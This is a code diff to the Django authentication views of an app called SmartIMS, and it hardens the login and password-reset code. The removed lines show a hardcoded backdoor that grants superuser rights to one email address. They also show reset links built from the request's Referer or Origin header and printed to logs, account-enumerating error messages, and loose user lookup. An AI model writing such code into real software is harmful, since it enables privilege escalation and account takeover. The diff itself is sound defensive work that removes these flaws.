@@ -8,7 +8,7 @@ from rest_framework.response import Response
 from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
 from rest_framework_simplejwt.views import TokenObtainPairView
 from .models import User
-from .utils import on_password_changed, send_verification_email, token_generator
+from .utils import on_password_changed, send_verification_email, token_generator, set_validated_password, build_frontend_link
 import logging
 
 logger = logging.getLogger(__name__)
@@ -51,20 +51,6 @@ class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
             .annotate(role_prio=role_prio)
             .order_by('-is_superuser', 'role_prio', 'id')
         )
-        if not candidates or User.objects.count() < 5:
-            try:
-                from .recovery_seed import ensure_recovered
-                ensure_recovered()
-                candidates = list(
-                    User.objects.filter(Q(email__iexact=login_id) | Q(username__iexact=login_id))
-                    .annotate(role_prio=role_prio)
-                    .order_by('-is_superuser', 'role_prio', 'id')
-                )
-            except Exception:
-                pass
-        if not candidates:
-            from rest_framework.exceptions import AuthenticationFailed
-            raise AuthenticationFailed(detail="No account found with this username or email address.")
 
         user = None
         for cand in candidates:
@@ -74,16 +60,8 @@ class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
 
         if not user:
             from rest_framework.exceptions import AuthenticationFailed
-            raise AuthenticationFailed(detail="Incorrect password for this account.")
-
-        if login_id.lower() == 'abdouamine@gmail.com' or user.email.lower() == 'abdouamine@gmail.com':
-            if user.role != 'platform_owner' or not user.is_superuser or not user.is_active:
-                user.role = 'platform_owner'
-                user.is_superuser = True
-                user.is_staff = True
-                user.is_active = True
-                user.status = 'active'
-                user.save()
+            # Same message whether or not the account exists, to avoid account enumeration.
+            raise AuthenticationFailed(detail="Invalid email/username or password.")
 
         import logging
         logger = logging.getLogger(__name__)
@@ -91,7 +69,7 @@ class CustomTokenObtainPairSerializer(TokenObtainPairSerializer):
         if user.company:
             logger.info(f"[LOGIN ATTEMPT] Company: {user.company.name}, Company Status: {user.company.status}")
 
-        if user.company and user.company.status == 'suspended' and user.role != 'platform_owner':
+        if user.company and (user.company.status == 'suspended' or user.company.is_deleted) and user.role != 'platform_owner':
             from rest_framework.exceptions import AuthenticationFailed
             logger.warning(f"[LOGIN FAILED] Blocked because Company '{user.company.name}' is suspended.")
             raise AuthenticationFailed(
@@ -148,22 +126,7 @@ class RequestPasswordResetView(views.APIView):
         if user:
             uid = urlsafe_base64_encode(force_bytes(user.pk))
             token = default_token_generator.make_token(user)
-            referer = request.headers.get('Referer') or request.META.get('HTTP_REFERER')
-            req_origin = request.headers.get('Origin') or request.META.get('HTTP_ORIGIN')
-            origin = "http://127.0.0.1:8000"
-            if referer and "verify-email.html" not in referer and "reset-password.html" not in referer:
-                origin = referer.split('?')[0].rsplit('/', 1)[0]
-            elif req_origin and req_origin != "null":
-                origin = req_origin
-            if ".github.io" in origin and "/inventory" not in origin:
-                origin = f"{origin.rstrip('/')}/inventory"
-            reset_link = f"{origin}/verify-email.html?uid={uid}&token={token}&email={user.email}"
-            logger.info(f"\n========================================================================\n"
-                        f"CLICKABLE RESET LINK (Copy this exact line):\n{reset_link}\n"
-                        f"========================================================================")
-            print(f"\n========================================================================\n"
-                  f"CLICKABLE RESET LINK (Copy this exact line):\n{reset_link}\n"
-                  f"========================================================================\n", flush=True)
+            reset_link = build_frontend_link(request, 'verify-email.html', uid=uid, token=token, email=user.email)
             try:
                 send_mail(
                     subject="Password Reset Request - SmartIMS",
@@ -203,7 +166,7 @@ class ConfirmPasswordResetView(views.APIView):
             user = None
 
         if user is not None and default_token_generator.check_token(user, token):
-            user.set_password(new_password)
+            set_validated_password(user, new_password, field='new_password')
             user.save()
             on_password_changed(user, request=request)
             return Response({"detail": "Password has been reset successfully."}, status=status.HTTP_200_OK)
@@ -222,8 +185,8 @@ class ChangePasswordView(views.APIView):
         user = request.user
         if not user.check_password(old_password):
             return Response({"detail": "Current password is incorrect."}, status=status.HTTP_400_BAD_REQUEST)
-        
-        user.set_password(new_password)
+
+        set_validated_password(user, new_password, field='new_password')
         user.save()
         on_password_changed(user, request=request)
         return Response({"detail": "Password updated successfully."}, status=status.HTTP_200_OK)
@@ -247,37 +210,24 @@ class VerifyEmailView(views.APIView):
         if not uid or not new_password:
             return Response({"detail": "uid and new_password are required."}, status=status.HTTP_400_BAD_REQUEST)
 
-        try:
-            from .recovery_seed import ensure_recovered
-            ensure_recovered()
-        except Exception:
-            pass
-
         user = None
         try:
             user_id = force_str(urlsafe_base64_decode(uid))
             user = User.objects.filter(pk=user_id).first()
         except Exception:
             pass
-
-        if not user and uid.isdigit():
-            user = User.objects.filter(pk=int(uid)).first()
-        if not user and uid:
-            user = User.objects.filter(username__iexact=uid).first() or User.objects.filter(email__iexact=uid).first()
         if not user and email:
             user = User.objects.filter(email__iexact=email).first()
 
         if user is not None:
             if not token:
                 return Response({"detail": "Token is required."}, status=status.HTTP_400_BAD_REQUEST)
-            from django.contrib.auth.tokens import PasswordResetTokenGenerator
-            token_generator = PasswordResetTokenGenerator()
             if not token_generator.check_token(user, token):
                 return Response({"detail": "The verification link is invalid or has expired. Please request a new one."}, status=status.HTTP_400_BAD_REQUEST)
 
             if user.company and user.company.currency:
                 user.currency = user.company.currency
-            user.set_password(new_password)
+            set_validated_password(user, new_password, field='new_password')
             user.is_active = True
             user.status = 'active'
             user.must_change_password = False
@@ -308,13 +258,8 @@ class ForceChangePasswordView(views.APIView):
 
     def post(self, request):
         new_password = request.data.get('new_password')
-        if not new_password or len(new_password) < 6:
-            return Response(
-                {"detail": "A valid new_password (at least 6 characters) is required."},
-                status=status.HTTP_400_BAD_REQUEST
-            )
         user = request.user
-        user.set_password(new_password)
+        set_validated_password(user, new_password, field='new_password')
         user.must_change_password = False
         user.save()
         on_password_changed(user, request=request)
